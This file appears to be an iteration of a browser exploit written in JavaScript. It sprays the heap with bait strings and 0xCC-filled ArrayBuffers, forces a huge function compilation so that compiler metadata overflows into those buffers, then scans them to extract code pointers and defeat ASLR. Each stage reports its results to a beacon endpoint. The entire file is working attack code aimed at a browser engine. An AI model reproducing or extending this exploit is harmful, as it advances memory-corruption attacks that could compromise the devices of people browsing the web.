// p473 — Bait-and-switch with AB targets at HIGHER addresses
//
// Root cause of V471/V472 failure: AB spray allocated BEFORE compilation
// → lower marge pages. Metadata allocated DURING compilation → higher pages.
// Forward-only sweep goes up from metadata → misses ABs below.
//
// FIX: p156 groom pattern with AB targets.
// 1. Allocate 20 bait strings (100KB) → low marge pages
// 2. Allocate AB targets (100KB each, 0xCC fill) → next marge pages (HIGHER)
// 3. Free baits + GC → holes at low addresses
// 4. Compile → metadata fills bait hole → sweep forward INTO AB targets
//
// Beacon prefix: V473-
(function() {
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V473-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }
  function hx(b) { return (b < 16 ? '0' : '') + b.toString(16); }
  function hexN(view, off, n) {
    var s = '';
    for (var i = 0; i < n && off + i < view.byteLength; i++) s += hx(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  // ═════════════════════════════════════════════
  // PHASE 1: Bait strings (100KB each) — LOW addresses
  // ═════════════════════════════════════════════
  var BAIT_COUNT = 20;
  var baits = new Array(BAIT_COUNT);
  for (var i = 0; i < BAIT_COUNT; i++) {
    var s = '';
    for (var j = 0; j < 1000; j++) s += 'B'.repeat(100);
    baits[i] = s;
  }
  B('BAITS', '' + BAIT_COUNT);

  // ═════════════════════════════════════════════
  // PHASE 2: AB targets (100,112 bytes each) — HIGHER addresses
  // Exact same size as MetadataTable allocation
  // ═════════════════════════════════════════════
  var AB_COUNT = 100;
  var AB_SZ = 100112;
  var MARKER = 0xCC;
  var abTargets = new Array(AB_COUNT);
  var abViews = new Array(AB_COUNT);
  for (var i = 0; i < AB_COUNT; i++) {
    abTargets[i] = new ArrayBuffer(AB_SZ);
    abViews[i] = new Uint8Array(abTargets[i]);
    for (var j = 0; j < AB_SZ; j++) abViews[i][j] = MARKER;
  }
  B('AB-TARGETS', AB_COUNT + 'x' + AB_SZ);

  // ═════════════════════════════════════════════
  // PHASE 3: Free baits + GC → holes at LOW addresses
  // ═════════════════════════════════════════════
  for (var i = 0; i < BAIT_COUNT; i++) baits[i] = null;
  baits = null;
  for (var g = 0; g < 30; g++) {
    var junk = [];
    for (var j = 0; j < 1000; j++) junk.push(new ArrayBuffer(8192));
    for (var j = 0; j < 500; j++) junk.push(new Array(50).fill(g));
    junk = null;
  }
  B('GC-DONE');

  // ═════════════════════════════════════════════
  // PHASE 4: Compile 38M function
  // Metadata fills bait hole → sweep forward INTO AB targets
  // ═════════════════════════════════════════════
  var N = 38348816;
  var CHUNK = 4000000;
  var nC = Math.floor(N / CHUNK);
  var rem = N - nC * CHUNK;
  var rep = 'a();'.repeat(CHUNK);
  var parts = new Array(nC + 3);
  parts[0] = 'window.__p473fn=function(a){';
  for (var c = 0; c < nC; c++) parts[1 + c] = rep;
  parts[nC + 1] = 'a();'.repeat(rem);
  parts[nC + 2] = '};window.__p473ok=1;';
  rep = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  B('BLOB', Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    B('COMPILED', window.__p473ok ? 'OK' : 'FAIL');
    doScan();
  };
  document.head.appendChild(sc);
  sc.src = url;

  function doScan() {
    // Full byte scan: ANY byte != 0xCC means sweep hit this AB
    var dirtyCount = 0;
    var firstDirtyAB = -1;
    var firstDirtyOff = -1;
    var firstDirtyVal = 0;
    var totalDirty = 0;

    for (var i = 0; i < AB_COUNT; i++) {
      var v = abViews[i];
      if (!v || v.byteLength !== AB_SZ) continue;
      var dirty = false;
      for (var j = 0; j < v.byteLength; j++) {
        if (v[j] !== MARKER) {
          if (!dirty) {
            dirty = true;
            dirtyCount++;
            if (firstDirtyAB < 0) {
              firstDirtyAB = i;
              firstDirtyOff = j;
              firstDirtyVal = v[j];
            }
          }
          totalDirty++;
          if (totalDirty > 500000) break;
        }
      }
      if (totalDirty > 500000) break;
    }

    B('DIRTY', dirtyCount + '-of-' + AB_COUNT);
    B('DIRTY-BYTES', '' + totalDirty);

    if (firstDirtyAB >= 0) {
      B('FIRST', 'ab=' + firstDirtyAB + ',off=' + firstDirtyOff + ',val=0x' + hx(firstDirtyVal));

      var v = abViews[firstDirtyAB];
      // Dump region around first dirty byte
      var ds = Math.max(0, firstDirtyOff - 16);
      var de = Math.min(v.byteLength, firstDirtyOff + 128);
      B('DUMP', 'off=' + ds + ':' + hexN(v, ds, de - ds));

      // Find entry alignment: try all 112 bases
      var bestBase = -1, bestScore = 0;
      for (var tryBase = 0; tryBase < 112; tryBase++) {
        var score = 0;
        for (var off = tryBase; off + 112 <= v.byteLength; off += 112) {
          if (off + 16 <= v.byteLength && u32(v, off + 12) === 0xFFFFFFFF) score += 10;
          else if (off + 16 <= v.byteLength && u32(v, off + 12) === 0) score += 1;
          if (off + 32 <= v.byteLength) {
            for (var b = off + 24; b < off + 32; b++) {
              if (v[b] !== MARKER && v[b] !== 0) score += 2;
            }
          }
          if (off + 72 <= v.byteLength) {
            var bci = u32(v, off + 68);
            if (bci > 0 && bci < 40000000 && bci !== 0xCCCCCCCC) score += 5;
          }
        }
        if (score > bestScore) { bestScore = score; bestBase = tryBase; }
      }
      B('ALIGN', 'base=' + bestBase + ',score=' + bestScore);

      if (bestBase >= 0 && bestScore >= 5) {
        // Extract thunk at bestBase+24 from first few entries
        for (var e = 0; e < 5 && bestBase + e * 112 + 32 <= v.byteLength; e++) {
          var eOff = bestBase + e * 112;
          var slow = hexN(v, eOff + 12, 4);
          var thunk = hexN(v, eOff + 24, 8);
          var bci = hexN(v, eOff + 68, 4);
          B('E' + e, 'slow=' + slow + ',thunk=' + thunk + ',bci=' + bci);
        }

        // Read thunk from entry 0
        var t0 = hexN(v, bestBase + 24, 8);
        B('THUNK-LE', t0);

        // Also check other dirty ABs for consistency
        var thunks = [t0];
        for (var i = firstDirtyAB + 1; i < AB_COUNT && thunks.length < 5; i++) {
          var v2 = abViews[i];
          var dirty2 = false;
          for (var j = 0; j < 16; j++) { if (v2[j] !== MARKER) { dirty2 = true; break; } }
          if (!dirty2) continue;
          var t = hexN(v2, bestBase + 24, 8);
          thunks.push(t);
        }
        B('THUNKS', thunks.join(','));

        // Check if thunks are consistent (same ASLR base)
        if (thunks.length >= 2 && thunks[0] === thunks[1]) {
          B('ASLR-CONSISTENT', thunks[0]);
        }
      }
    } else {
      B('NO-HIT', 'zero dirty ABs');
      // Verify markers intact
      var intact = 0;
      for (var i = 0; i < Math.min(5, AB_COUNT); i++) {
        var ok = true;
        for (var j = 0; j < 16; j++) { if (abViews[i][j] !== MARKER) { ok = false; break; } }
        if (ok) intact++;
      }
      B('MARKER-OK', intact + '-of-5');
    }

    B('DONE');
  }
})();
